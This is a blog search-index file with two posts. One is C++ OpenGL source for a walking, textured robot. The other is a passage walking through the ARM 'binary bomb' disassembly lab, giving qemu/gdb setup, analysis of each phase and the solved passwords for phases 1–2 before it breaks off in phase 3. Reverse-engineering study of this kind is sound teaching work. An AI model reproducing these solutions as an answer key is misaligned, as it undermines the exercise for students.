<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[open_Rebort]]></title>
    <url>%2F2017%2F05%2F16%2Fopen-Rebort%2F</url>
    <content type="text"><![CDATA[该项目使用opengl做的一个机器人，能够行走，旋转，并对机器人贴了图。具体源码请参考我的github 实验环境：visual studio 2015 源码解析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560// gl_robot2.cpp : 定义控制台应用程序的入口点。//#define GLUT_DISABLE_ATEXIT_HACK#pragma comment(lib, &quot;legacy_stdio_definitions.lib&quot;)#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;gl/glut.h&gt;#include &lt;gl\GLAUX.H&gt;#include &lt;cmath&gt;#define GLOBAL_SIZE 0.5#define PI 3.1415926bool isLeft = true;static const GLfloat leg_x = 2.0, leg_y = 0.6, leg_z = 0.5; //腿的坐标系缩放比例static const GLfloat body_x = 1.2, body_y = 2.4, body_z = 1.8; //身体的坐标系缩放比例static const GLfloat head_x = 1.0, head_z = 1.2, head_y = 1; //头的半径static const GLfloat arm_x = 1.6, arm_y = 0.6, arm_z = 0.4; //手臂的坐标系缩放比例static const GLfloat head_radis = 0.25;static const GLfloat foot_x = 1.0, foot_y = 0.3, foot_z = 0.4; //脚的坐标系缩放比例static const GLfloat neck_x = head_x / 2, neck_y = head_y, neck_z = head_z / 4;static GLfloat centerX = 0.0, centerY = 0.0, centerZ = 0.0;static GLint angle = 0;//初始的角度为竖直的static int leftHigherLegAngle = -90, rightHigherLegAngle = -90;static int LeftLowerLegAngle = 90, rightLowerLegAngle = 0;static int leftHigherHandAngle = -90, rightHigherHandAngle = -90;static int leftLowerHandAngle = 0, rightLowerHandAngle = 0;static int leftFootAngle = 0, rightFootAngle = 0;int speed = 1;GLUquadricObj *quadratic; //画三维物体时用到GLuint g_texture = 0, g_texture_head = 0, g_texture_ground = 0, g_texture_sky = 0;void init(void) &#123; glClearColor(0.0, 0.0, 0.0, 0.0); glShadeModel(GL_FLAT); glEnable(GL_DEPTH_TEST); //glCullFace(GL_BACK);//背面裁剪(背面不可见) //glEnable(GL_CULL_FACE);//启用裁剪 glEnable(GL_TEXTURE_2D); quadratic = gluNewQuadric(); gluQuadricNormals(quadratic, GLU_SMOOTH);&#125;//画立方体的函数void drawCube_head(GLfloat x, GLfloat y, GLfloat z)&#123; GLfloat x1 = 0.5 * x / 2; GLfloat y1 = 0.5 * y / 2; GLfloat z1 = 0.5 * z / 2; glBindTexture(GL_TEXTURE_2D, g_texture_head); glBegin(GL_QUADS); //glPushMatrix(); //画前面 glVertex3f(-x1, y1, z1); glVertex3f(x1, y1, z1); glVertex3f(x1, -y1, z1); glVertex3f(-x1, -y1, z1); //画后面 glVertex3f(-x1, y1, -z1); glVertex3f(x1, y1, -z1); glVertex3f(x1, -y1, -z1); glVertex3f(-x1, -y1, -z1); //画上面 glVertex3f(-x1, y1, z1); glVertex3f(x1, y1, z1); glVertex3f(x1, y1, -z1); glVertex3f(-x1, y1, -z1); //画底面 glVertex3f(-x1, -y1, z1); glVertex3f(x1, -y1, z1); glVertex3f(x1, -y1, -z1); glVertex3f(-x1, -y1, -z1); //画左面 glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, y1, z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(-x1, y1, -z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(-x1, -y1, -z1); glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, -y1, z1); //画右面 glVertex3f(x1, y1, z1); glVertex3f(x1, y1, -z1); glVertex3f(x1, -y1, -z1); glVertex3f(x1, -y1, z1); glEnd(); //glPopMatrix();&#125;void drawCube(GLfloat x, GLfloat y, GLfloat z)&#123; GLfloat x1 = 0.5 * x / 2; GLfloat y1 = 0.5 * y / 2; GLfloat z1 = 0.5 * z / 2; glBindTexture(GL_TEXTURE_2D, g_texture); glBegin(GL_QUADS); //glPushMatrix(); //画前面 glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, y1, z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(x1, y1, z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(x1, -y1, z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, -y1, z1); //画后面 glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, y1, -z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(x1, y1, -z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(x1, -y1, -z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, -y1, -z1); //画上面 glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, y1, z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(x1, y1, z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(x1, y1, -z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, y1, -z1); //画底面 glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, -y1, z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(x1, -y1, z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(x1, -y1, -z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, -y1, -z1); //画左面 glTexCoord2f(0.0f, 0.0f); glVertex3f(-x1, y1, z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(-x1, y1, -z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(-x1, -y1, -z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(-x1, -y1, z1); //画右面 glTexCoord2f(0.0f, 0.0f); glVertex3f(x1, y1, z1); glTexCoord2f(1.0f, 0.0f); glVertex3f(x1, y1, -z1); glTexCoord2f(1.0f, 1.0f); glVertex3f(x1, -y1, -z1); glTexCoord2f(0.0f, 1.0f); glVertex3f(x1, -y1, z1); glEnd(); //glPopMatrix();&#125;int LoadGLTexTures_head(GLuint&amp; unTexture, const char* chFileName)&#123; AUX_RGBImageRec *TextureImage; //保存贴图数据的指针 TextureImage = auxDIBImageLoadA((LPCSTR)&quot;face.bmp&quot;); //TextureImage_head = auxDIBImageLoadA((LPCSTR)&quot;face.bmp&quot;); glGenTextures(1, &amp;unTexture); glBindTexture(GL_TEXTURE_2D, unTexture); //设置纹理的信息， glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage-&gt;sizeX, TextureImage-&gt;sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage-&gt;data); glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR); //设置滤波为线性滤波 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);//线性滤波 if (TextureImage)//释放资源 &#123; if (TextureImage-&gt;data) &#123; free(TextureImage-&gt;data); &#125; free(TextureImage); &#125; return 1;&#125;int LoadGLTexTures(GLuint&amp; unTexture, const char* chFileName)&#123; AUX_RGBImageRec *TextureImage; //保存贴图数据的指针 TextureImage = auxDIBImageLoadA((LPCSTR)&quot;body.bmp&quot;); //TextureImage_head = auxDIBImageLoadA((LPCSTR)&quot;face.bmp&quot;); glGenTextures(1, &amp;unTexture); glBindTexture(GL_TEXTURE_2D, unTexture); //设置纹理的信息， glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage-&gt;sizeX, TextureImage-&gt;sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage-&gt;data); glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR); //设置滤波为线性滤波 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);//线性滤波 if (TextureImage)//释放资源 &#123; if (TextureImage-&gt;data) &#123; free(TextureImage-&gt;data); &#125; free(TextureImage); &#125; return 1;&#125;int LoadGLTexTures_ground(GLuint&amp; unTexture, const char* chFileName)&#123; AUX_RGBImageRec *TextureImage; //保存贴图数据的指针 TextureImage = auxDIBImageLoadA((LPCSTR)&quot;ground.bmp&quot;); //TextureImage_head = auxDIBImageLoadA((LPCSTR)&quot;face.bmp&quot;); glGenTextures(1, &amp;unTexture); glBindTexture(GL_TEXTURE_2D, unTexture); //设置纹理的信息， glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage-&gt;sizeX, TextureImage-&gt;sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage-&gt;data); glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR); //设置滤波为线性滤波 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);//线性滤波 if (TextureImage)//释放资源 &#123; if (TextureImage-&gt;data) &#123; free(TextureImage-&gt;data); &#125; free(TextureImage); &#125; return 1;&#125;int LoadGLTexTures_sky(GLuint&amp; unTexture, const char* chFileName)&#123; AUX_RGBImageRec *TextureImage; //保存贴图数据的指针 TextureImage = auxDIBImageLoadA((LPCSTR)&quot;sky.bmp&quot;); //TextureImage_head = auxDIBImageLoadA((LPCSTR)&quot;face.bmp&quot;); glGenTextures(1, &amp;unTexture); glBindTexture(GL_TEXTURE_2D, unTexture); //设置纹理的信息， glTexImage2D(GL_TEXTURE_2D, 0, 3, TextureImage-&gt;sizeX, TextureImage-&gt;sizeY, 0, GL_RGB, GL_UNSIGNED_BYTE, TextureImage-&gt;data); glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR); //设置滤波为线性滤波 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);//线性滤波 if (TextureImage)//释放资源 &#123; if (TextureImage-&gt;data) &#123; free(TextureImage-&gt;data); &#125; free(TextureImage); &#125; return 1;&#125;void DrawGround()&#123; GLfloat y = -GLOBAL_SIZE * leg_x * 2 - GLOBAL_SIZE * foot_y; glBindTexture(GL_TEXTURE_2D, g_texture_ground); glBegin(GL_QUADS); glTexCoord2f(0.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ + 20.0f); glTexCoord2f(1.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ + 20.0f); glTexCoord2f(0.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ - 20.0f); glEnd();&#125;void DrawSky()&#123; GLfloat y = 3.5; GLfloat y1 = -GLOBAL_SIZE * leg_x * 2 - GLOBAL_SIZE * foot_y; glBindTexture(GL_TEXTURE_2D, g_texture_sky); glBegin(GL_QUADS); glTexCoord2f(0.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ + 20.0f); glTexCoord2f(1.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ + 20.0f); glTexCoord2f(0.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ - 20.0f); glTexCoord2f(0.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ + 20.0f); glTexCoord2f(1.0f, 1.0f); glVertex3f(centerX - 20.0f, y1, centerZ + 20.0f); glTexCoord2f(0.0f, 1.0f); glVertex3f(centerX - 20.0f, y1, centerZ - 20.0f); glTexCoord2f(0.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 1.0f); glVertex3f(centerX + 20.0f, y, centerZ + 20.0f); glTexCoord2f(1.0f, 0.0f); glVertex3f(centerX + 20.0f, y1, centerZ + 20.0f); glTexCoord2f(0.0f, 0.0f); glVertex3f(centerX + 20.0f, y1, centerZ - 20.0f); glTexCoord2f(0.0f, 0.0f); glVertex3f(centerX - 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 0.0f); glVertex3f(centerX + 20.0f, y, centerZ - 20.0f); glTexCoord2f(1.0f, 1.0f); glVertex3f(centerX + 20.0f, y1, centerZ - 20.0f); glTexCoord2f(0.0f, 1.0f); glVertex3f(centerX - 20.0f, y1, centerZ - 20.0f); glEnd();&#125;void display(void) &#123; glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT); //清空颜色缓冲和深度缓冲 DrawGround(); DrawSky(); glColor3f(0.8, 0.8, 0.8); glPushMatrix(); //robot的位置和方向设置 glTranslatef(centerX, centerY, centerZ); glRotatef(angle, 0.0, 1.0, 0.0); glColor3f(0.5, 0.5, 0.5); //设置颜色为灰色 glPushMatrix(); //画出左大腿 glColor3f(0.5, 0.5, 0.5); glRotatef((GLfloat)leftHigherLegAngle, 0, 0, 1.0); glTranslatef(0.5*leg_x / 2, 0.0, leg_z * 0.5); glPushMatrix(); glScalef(leg_x, leg_y, leg_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(0.5 * leg_x / 2, 0.0, 0.0); //画关节 glPushMatrix(); glTranslatef(0.0, 0.0, -0.5*leg_z / 2); gluCylinder(quadratic, 0.5 * leg_y / 2, 0.5 * leg_y / 2, leg_z * 0.5, 32, 32); glPopMatrix(); glRotatef(LeftLowerLegAngle, 0.0, 0.0, 1.0); //画左小腿 glTranslatef(0.5*leg_x / 2, 0.0, 0.0); glPushMatrix(); glColor3f(0.5, 0.5, 0.5); glScalef(leg_x - 0.2, leg_y - 0.2, leg_z - 0.2); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(0.5*leg_x / 2, 0.0, 0.0); glRotatef(90, 0.0, 0.0, 1.0); glTranslatef(-0.5*foot_x / 2 + 0.5*foot_y / 2, 0.0, 0.0); glRotatef(leftFootAngle, 0.0, 0.0, 1.0); glPushMatrix(); glScalef(foot_x, foot_y, foot_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glPopMatrix(); glPushMatrix(); //画出右大腿 glColor3f(0.25, 0.45, 0.25); glRotatef((GLfloat)rightHigherLegAngle, 0, 0, 1.0); glTranslatef(leg_x / 4, 0.0, -leg_z / 2); glPushMatrix(); glScalef(leg_x, leg_y, leg_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(leg_x / 4, 0, 0); //画关节 glPushMatrix(); glTranslatef(0.0, 0.0, -leg_z / 4); gluCylinder(quadratic, leg_y / 4, leg_y / 4, leg_z / 2, 32, 32); glPopMatrix(); glRotatef(rightLowerLegAngle, 0.0, 0.0, 1.0); //画左小腿 glTranslatef(leg_x / 4, 0.0, 0.0); glPushMatrix(); glColor3f(0.5, 0.5, 0.5); glScalef(leg_x - 0.2, leg_y - 0.2, leg_z - 0.2); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(leg_x / 4, 0.0, 0.0); glRotatef(90, 0.0, 0.0, 1.0); glTranslatef(-foot_x / 4 + leg_y / 4, 0.0, 0.0); glRotatef(rightFootAngle, 0.0, 0.0, 1.0); glPushMatrix(); glScalef(foot_x, foot_y, foot_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glPopMatrix(); // 身体 glColor3f(1.0, 1.0, 1.0); glPushMatrix(); glColor3f(0.65, 0.45, 0.45); glTranslatef(0, body_y / 4, 0.0); drawCube(body_x, body_y, body_z); glPopMatrix(); glPushMatrix(); //脖子 glColor3f(0.25, 0.75, 0.75); glTranslatef(0, 0.5*body_y, 0); glScalef(neck_x, neck_y, neck_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); // 头部 glPushMatrix(); glColor3f(0.5, 0.5, 0.5); glTranslatef(0, 0.5*body_y + 0.5*head_y, 0); drawCube_head(head_x, head_y, head_z); glPopMatrix(); glColor3f(0.5, 0.55, 0.55); glPushMatrix(); //画左手 glColor3f(0.5, 0.6, 0.6); glTranslatef(0, 0.5*body_y, 0.0); glRotatef(leftHigherHandAngle, 0.0, 0.0, 1.0); glTranslatef(arm_x / 4, 0.0, (body_z + arm_z) / 4); glPushMatrix(); glScalef(arm_x - 0.1, arm_y - 0.1, arm_z - 0.1); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(arm_x / 4, 0.0, 0.0); glPushMatrix(); glColor3f(0.5, 0.55, 0.55); glTranslatef(0.0, 0.0, -arm_z / 4); gluCylinder(quadratic, arm_y / 4, arm_y / 4, arm_z*0.5, 32, 32); glPopMatrix(); glRotatef(leftLowerHandAngle, 0.0, 0.0, 1.0); glTranslatef(arm_x / 4, 0.0, 0.0); glPushMatrix(); glScalef(arm_x - 0.1, arm_y - 0.1, arm_z - 0.1); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glPopMatrix(); glPushMatrix(); //画右手 glColor3f(0.5, 0.55, 0.55); glTranslatef(0, body_y / 2, 0.0); glRotatef(rightHigherHandAngle, 0.0, 0.0, 1.0); glTranslatef(arm_x / 4, 0.0, -(body_z + arm_z) / 4); glPushMatrix(); glScalef(arm_x, arm_y, arm_z); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glTranslatef(arm_x / 4, 0.0, 0.0); glPushMatrix(); glColor3f(0.5, 0.55, 0.55); glTranslatef(0.0, 0.0, -arm_z / 4); gluCylinder(quadratic, arm_y / 4, arm_y / 4, arm_z*0.5, 32, 32); glPopMatrix(); glRotatef(rightLowerHandAngle, 0.0, 0.0, 1.0); glTranslatef(arm_x / 4, 0.0, 0.0); glPushMatrix(); glScalef(arm_x - 0.1, arm_y - 0.1, arm_z - 0.1); glutSolidCube(GLOBAL_SIZE); glPopMatrix(); glPopMatrix(); glPopMatrix(); glFlush(); glutSwapBuffers();&#125;static double lookatx = -3.5, lookatz = -3.5, lookaty = 0;static int scrw, scrh;//实时刷新void reshape(int w, int h) &#123; scrw = w; scrh = h; glViewport(0, 0, (GLsizei)w, (GLsizei)h); glMatrixMode(GL_PROJECTION); glLoadIdentity(); gluPerspective(60.0, (GLfloat)w / (GLfloat)h, 1.0, 200.0); glMatrixMode(GL_MODELVIEW); glLoadIdentity(); gluLookAt(lookatx, lookaty, lookatz, centerX, 0, centerZ, 0.0, 1.0, 0.0);&#125;//响应鼠标事件void passiveMotionFunc(int x, int y) &#123; lookatx = -5.0 + (double)x / scrw * 10.0; lookatz = sqrt(25 - lookatx * lookatx) + centerZ; lookatx += centerX; double tmpy = -5.0 + (double)y / scrh * 10.0; if (tmpy &gt;= -GLOBAL_SIZE * leg_x * 2) lookaty = tmpy; glLoadIdentity(); glutPostRedisplay(); gluLookAt(lookatx, lookaty, lookatz, centerX, 0, centerZ, 0.0, 1.0, 0.0);&#125;bool left = false;//规定当角度大于-75度时，小腿的角度变化，并比大腿变化快，规定是大腿地4倍//响应键盘事件的，当按&apos;w&apos;时先前走，当按&apos;s&apos;时为向后转void keyboard(unsigned char key, int x, int y)&#123; switch (key) &#123; case &apos;w&apos;: for (int i = 0; i &lt; speed; i++) &#123; centerY = leg_x * sin(-leftHigherLegAngle / 180.0 * PI) - leg_x; // 为了简化计算，我粗略假定大腿每动1度，人会朝着其方向前进0.035个单位长度 double mvx = cos(angle / 180.0 * PI) * 0.035; // 计算x轴方向移动的距离 double mvz = sin(angle / 180.0 * PI) * 0.035; // 计算z轴方向移动的距离 if (!left) &#123; //左脚迈出 leftHigherLegAngle--; rightHigherLegAngle++; if (leftHigherLegAngle &gt;= -75) &#123; LeftLowerLegAngle += 6; leftFootAngle = 0; &#125; else if (leftHigherLegAngle &lt; -105) LeftLowerLegAngle -= 6; if (leftHigherLegAngle == -120) &#123; left = true; &#125; leftHigherHandAngle++; leftLowerHandAngle++; rightHigherHandAngle--; rightLowerHandAngle--; &#125; else &#123; leftHigherLegAngle++; rightHigherLegAngle--; if (rightHigherLegAngle &gt;= -75) &#123; rightLowerLegAngle += 6; rightFootAngle = 0; &#125; else if (rightHigherLegAngle &lt; -105) rightLowerLegAngle -= 6; if (leftHigherLegAngle == -60) left = false; leftHigherHandAngle--; leftLowerHandAngle--; rightHigherHandAngle++; rightLowerHandAngle++; &#125; centerX -= mvx; lookatx -= mvx; centerZ += mvz; lookatz += mvz; // 调整视角，始终把屏幕中心对准人的中心 glLoadIdentity(); gluLookAt(lookatx, lookaty, lookatz, centerX, 0, centerZ, 0.0, 1.0, 0.0); glutPostRedisplay(); &#125; break; case &apos;s&apos;: angle = (angle + 180) % 360; glutPostRedisplay(); break; case &apos;a&apos;: //左转 angle = (angle + 5) % 360; glutPostRedisplay(); break; case &apos;d&apos;: //右转 angle = (angle - 5) % 360; glutPostRedisplay(); break; case &apos;f&apos;: speed++; break; case &apos;h&apos;: if (speed &gt; 0) speed--; break; &#125;&#125;//设置光照 void SetupLights()&#123; GLfloat ambientLight[] = &#123; 0.45f, 0.45f, 0.5f, 1.0f &#125;;//环境光 GLfloat diffuseLight[] = &#123; 0.55f, 0.55f, 0.55f, 1.0f &#125;;//漫反射 GLfloat specularLight[] = &#123; 0.6f, 0.6f, 0.6f, 1.0f &#125;;//镜面光 GLfloat lightPos[] = &#123; 50.0f, 80.0f, 60.0f, 1.0f &#125;;//光源位置 glEnable(GL_LIGHTING); //启用光照 glLightfv(GL_LIGHT0, GL_AMBIENT, ambientLight);//设置环境光源 glLightfv(GL_LIGHT0, GL_DIFFUSE, diffuseLight);//设置漫反射光源 glLightfv(GL_LIGHT0, GL_SPECULAR, specularLight); //设置镜面光源 glLightfv(GL_LIGHT0, GL_POSITION, lightPos);//设置灯光位置 glEnable(GL_LIGHT0);//打开第一个灯光 glEnable(GL_COLOR_MATERIAL);//启用材质的颜色跟踪 glColorMaterial(GL_FRONT, GL_AMBIENT_AND_DIFFUSE); //指定材料着色的面 glMaterialfv(GL_FRONT, GL_SPECULAR, specularLight); //指定材料对镜面光的反应 glMateriali(GL_FRONT, GL_SHININESS, 100); //指定反射系数 &#125;int main(int argc, char **argv) &#123; glutInit(&amp;argc, argv); glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGB | GLUT_DEPTH); glutInitWindowSize(500, 500); glutInitWindowPosition(100, 100); glutCreateWindow(argv[0]); init(); LoadGLTexTures(g_texture, &quot;body.bmp&quot;); LoadGLTexTures_head(g_texture_head, &quot;face.bmp&quot;); LoadGLTexTures_ground(g_texture_ground, &quot;ground.bmp&quot;); LoadGLTexTures_sky(g_texture_sky, &quot;sky.bmp&quot;); glutDisplayFunc(display); glutReshapeFunc(reshape); //屏幕刷新是用 glutKeyboardFunc(keyboard);//按下按键 glutPassiveMotionFunc(passiveMotionFunc);//鼠标转动 SetupLights(); glutMainLoop(); return 0;&#125; 实验截图]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>计算机图形学</tag>
        <tag>opengl</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bomb]]></title>
    <url>%2F2017%2F05%2F16%2FBomb%2F</url>
    <content type="text"><![CDATA[x86上的二进制炸弹对于反汇编的练习来说还是比较经典的，由于网上有很多该程序的讲解，所以在此我打算写一下arm平台上的二进制拆炸弹这个游戏。 环境的搭建 由于是arm平台的环境，所以需要在linux环境下安装一个模拟器，在此我选择了qemu该模拟器，具体操作如下(该操作对Ubuntu环境有效，其他linux版本可自行查找方法) sudo apt-get install qemu-user 运行ARM指令集模拟器并运行开启gdbserver和运行bomb_1程序 qemu-arm -g 8009 bomb_1 其中，-g参数是为了添加调试信息，为了使远程gdb调试能够起作用，8009为自定义的端口号。 另外启动一个终端，通过命令远程开启gdb调试器并加载待调试程序。 arm-linux-gdb bomb_1 输命令来连接模拟器中的gdbserver target remote localhost:8009 辅助工具IDA pro。IDA pro是一款静态分析的反汇编工具，利用它可以查看数据段的具体数据，用起来十分方便。 具体分析Phase 1Arm指令123456789101112131415160000844c &lt;phase_1&gt;:844c: e92d4800 push &#123;fp, lr&#125;8450: e28db004 add fp, sp, #48454: e24dd008 sub sp, sp, #88458: e50b0008 str r0, [fp, #-8]845c: e51b0008 ldr r0, [fp, #-8]8460: e59f101c ldr r1, [pc, #28] ; 8484 &lt;phase_1+0x38&gt;8464: eb000241 bl 8d70 &lt;strings_not_equal&gt;8468: e1a03000 mov r3, r0846c: e3530000 cmp r3, #08470: 0a000000 beq 8478 &lt;phase_1+0x2c&gt;8474: eb000321 bl 9100 &lt;explode_bomb&gt;8478: e24bd004 sub sp, fp, #4847c: e8bd4800 pop &#123;fp, lr&#125;8480: e12fff1e bx lr8484: 0006483c .word 0x0006483c 反汇编分析从标重点的三行汇编可以看出，该代码从把输入的字符串为参数1，把8484里存的字符串作为参数2，然后再调用函数strings_not_equal,判断两个函数是否相等。所以关键是找8484处的地址存的字符串。有IDA pro可以看出8484处存的是数据段6483c处存的字符串，所以用ida可以找出该处的字符串。 密码 密码为Let’s begin now! 利用gdb及arm服务器验证该答案正确。 Phase 2Arm指令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484900008488 &lt;phase_2&gt;:8488: e92d4800 push &#123;fp, lr&#125;848c: e28db004 add fp, sp, #48490: e24dd028 sub sp, sp, #40 ; 0x288494: e50b0028 str r0, [fp, #-40] ; 0xffffffd88498: e24b3020 sub r3, fp, #32849c: e51b0028 ldr r0, [fp, #-40] ; 0xffffffd884a0: e1a01003 mov r1, r384a4: eb0001f4 bl 8c7c &lt;read_six_numbers&gt; ○1////////////////////////////////////////////////84a8: e51b3020 ldr r3, [fp, #-32] ; 0xffffffe0 84ac: e3530001 cmp r3, #184b0: 0a000000 beq 84b8 &lt;phase_2+0x30&gt; ○284b4: eb000311 bl 9100 &lt;explode_bomb&gt;84b8: e3a03001 mov r3, #184bc: e50b3008 str r3, [fp, #-8]84c0: e51b3008 ldr r3, [fp, #-8]84c4: e2432001 sub r2, r3, #184c8: e3e0301b mvn r3, #2784cc: e1a02102 lsl r2, r2, #284d0: e24b0004 sub r0, fp, #484d4: e0802002 add r2, r0, r284d8: e0823003 add r3, r2, r384dc: e5933000 ldr r3, [r3]84e0: e51b2008 ldr r2, [fp, #-8]84e4: e2421001 sub r1, r2, #1 ○384e8: e0020391 mul r2, r1, r384ec: e51b1008 ldr r1, [fp, #-8]84f0: e3e0301b mvn r3, #2784f4: e1a01101 lsl r1, r1, #284f8: e24b0004 sub r0, fp, #484fc: e0801001 add r1, r0, r18500: e0813003 add r3, r1, r3 ○48504: e5933000 ldr r3, [r3]//////////////////////////////////////////////8508: e1520003 cmp r2, r3850c: 0a000000 beq 8514 &lt;phase_2+0x8c&gt; ○58510: eb0002fa bl 9100 &lt;explode_bomb&gt;//////////////////////////////////////////////8514: e51b3008 ldr r3, [fp, #-8]8518: e2833001 add r3, r3, #1851c: e50b3008 str r3, [fp, #-8]8520: e51b3008 ldr r3, [fp, #-8]8524: e3530005 cmp r3, #58528: daffffe4 ble 84c0 &lt;phase_2+0x38&gt;852c: e24bd004 sub sp, fp, #48530: e8bd4800 pop &#123;fp, lr&#125;8534: e12fff1e bx lr 反汇编分析该炸弹的逻辑是for循环。○1处那两行由函数名可以看出为从终端读取六个数，并将其存入一个数组中，且地址从fp-32开始。○2处那四行是读取数组第一个数判断是否为1，如果是1继续判断，如果不是就会explode_bomb。如果是1 的话就会使i = 1到5，然后判断每一个数值。○3那四行及以上几行的逻辑是取出a[i-1]的值，并将a[i-1]*(i-1),然后存入r2中。○4那两行及以上几行的逻辑是取出a[i]的数据，并将其存入r3中。○5处的逻辑是判断r2和r3的值，如果相等则i+1，继续判断，如果不行等则explode_bomb。其大致的c语言逻辑如下： 12345678if(a[0] != 1) explode_bomb();for(i = 1;i &lt;= 5;i++)&#123; if(a[i] != a[i-1]*(i-1)) explode_bomb();&#125; 所以a[0] = 1;a[1] = a[2] = a[3] = a[4] = a[5] = 0; 密码1 0 0 0 0 0 Phase 3arm指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697989910010110210310410510610710810911011111211311411511611700008538 &lt;phase_3&gt;:8538: e92d4800 push &#123;fp, lr&#125;853c: e28db004 add fp, sp, #48540: e24dd020 sub sp, sp, #328544: e50b0018 str r0, [fp, #-24] ; 0xffffffe88548: e51b0018 ldr r0, [fp, #-24] ; 0xffffffe8854c: e59f119c ldr r1, [pc, #412] ; 86f0 &lt;phase_3+0x1b8&gt;○18550: e24b2014 sub r2, fp, #208554: e24b300d sub r3, fp, #138558: e24bc00c sub ip, fp, #12855c: e58dc000 str ip, [sp]8560: eb000976 bl ab40 &lt;_IO_sscanf&gt;8564: e1a03000 mov r3, r08568: e3530002 cmp r3, #2856c: ca000000 bgt 8574 &lt;phase_3+0x3c&gt; ○2 8570: eb0002e2 bl 9100 &lt;explode_bomb&gt;///////////////////////////////////////////////////8574: e51b3014 ldr r3, [fp, #-20] ; 0xffffffec8578: e3530007 cmp r3, #7857c: 979ff103 ldrls pc, [pc, r3, lsl #2]8580: ea000041 b 868c 